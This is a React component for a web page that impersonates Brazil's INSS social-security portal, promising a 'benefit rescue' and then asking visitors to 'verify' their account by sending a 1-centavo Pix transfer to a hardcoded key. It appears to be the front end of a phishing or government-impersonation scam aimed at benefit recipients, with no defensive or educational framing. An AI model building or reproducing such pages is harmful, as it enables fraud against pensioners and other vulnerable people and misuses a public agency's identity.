import GovHeader from "@/components/GovHeader";
import logo from "@/assets/logo.png";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Copy, Check, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const PIX_KEY = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

const ApkScreen = () => {
  const [modalOpen, setModalOpen] = useState(false);
  const [step, setStep] = useState(1);
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();

  const handleCopy = async () => {
    await navigator.clipboard.writeText(PIX_KEY);
    setCopied(true);
    toast({ title: "Chave copiada!", description: "Cole no app do seu banco." });
    setTimeout(() => setCopied(false), 2000);
  };

  const handleClose = (open: boolean) => {
    if (!open) {
      setModalOpen(false);
      setTimeout(() => setStep(1), 300);
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <GovHeader />

      {/* Hero */}
      <section className="bg-card border-b border-border">
        <div className="container py-8 flex items-center gap-4">
          <img src={logo} alt="Logo" className="h-16 w-16 object-contain" />
          <div>
            <h1 className="text-2xl font-bold text-foreground">Meu INSS</h1>
            <p className="text-muted-foreground text-sm">Resgate de Benefícios</p>
          </div>
        </div>
      </section>

      {/* Card Central */}
      <section className="container py-16 flex justify-center">
        <Card className="w-full max-w-md text-center shadow-lg">
          <CardHeader>
            <div className="mx-auto h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center mb-4">
              <ShieldCheck className="h-8 w-8 text-primary" />
            </div>
            <CardTitle className="text-xl">Resgate seu benefício</CardTitle>
          </CardHeader>
          <CardContent>
            <p className="text-muted-foreground text-sm mb-6">
              Clique no botão abaixo para iniciar o processo de resgate do seu benefício.
            </p>
            <Button
              onClick={() => setModalOpen(true)}
              className="bg-primary text-primary-foreground hover:bg-primary/90 rounded-xl px-8 py-6 text-lg font-bold shadow-md w-full"
            >
              Resgatar Agora
            </Button>
          </CardContent>
        </Card>
      </section>

      {/* Modal */}
      <Dialog open={modalOpen} onOpenChange={handleClose}>
        <DialogContent className="sm:max-w-md">
          <AnimatePresence mode="wait">
            {step === 1 && (
              <motion.div
                key="step1"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                transition={{ duration: 0.25 }}
              >
                <DialogHeader>
                  <DialogTitle>Verificação Necessária</DialogTitle>
                  <DialogDescription className="pt-3">
                    Para resgatar o benefício, é necessário realizar uma verificação para confirmar a conta do beneficiário.
                  </DialogDescription>
                </DialogHeader>
                <div className="mt-6">
                  <Button
                    onClick={() => setStep(2)}
                    className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-xl py-5 text-base font-semibold"
                  >
                    Prosseguir
                  </Button>
                </div>
              </motion.div>
            )}

            {step === 2 && (
              <motion.div
                key="step2"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                transition={{ duration: 0.25 }}
              >
                <DialogHeader>
                  <DialogTitle>Verificação de Conta</DialogTitle>
                </DialogHeader>
                <div className="mt-4 space-y-4">
                  <p className="text-sm text-muted-foreground">
                    Para realizar a verificação realize uma transferência de{" "}
                    <strong className="text-foreground">1 CENTAVO</strong>
                  </p>

                  <div className="bg-muted rounded-lg p-4 space-y-2">
                    <p className="text-xs text-muted-foreground font-medium uppercase tracking-wider">
                      Chave Pix
                    </p>
                    <div className="flex items-center gap-2">
                      <code className="flex-1 text-sm text-foreground font-mono bg-background rounded-md px-3 py-2 border border-border break-all">
                        {PIX_KEY}
                      </code>
                      <Button
                        variant="outline"
                        size="icon"
                        onClick={handleCopy}
                        className="shrink-0"
                      >
                        {copied ? (
                          <Check className="h-4 w-4 text-accent" />
                        ) : (
                          <Copy className="h-4 w-4" />
                        )}
                      </Button>
                    </div>
                  </div>

                  <Button
                    onClick={handleCopy}
                    className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-xl py-5 text-base font-semibold"
                  >
                    Copiar Chave Pix
                  </Button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </DialogContent>
      </Dialog>

      {/* Footer */}
      <footer className="bg-gov-bar text-gov-bar-foreground py-10 mt-auto">
        <div className="container text-center text-sm text-gov-bar-foreground/80">
          © 2024 INSS — Instituto Nacional do Seguro Social
        </div>
      </footer>
    </div>
  );
};

export default ApkScreen;
